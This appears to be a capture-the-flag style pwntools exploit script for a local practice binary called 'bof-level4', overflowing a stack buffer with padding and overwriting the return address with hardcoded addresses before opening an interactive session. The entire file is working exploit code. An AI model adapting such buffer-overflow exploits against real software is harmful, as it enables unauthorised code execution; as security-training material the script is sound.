#!/usr/bin/env python

from pwn import *

p = process("./bof-level4")

buffer = "A" * 20
buffer += "ABCDEFGH"
buffer += 'AAAAAAAA'

#Saved ebp
#buffer += p32(0xffffd558)
#correct return address
buffer += p32(0x804876b)
buffer += p32(0x8048530) * 4
print(buffer)
p.sendline(buffer)
p.interactive()
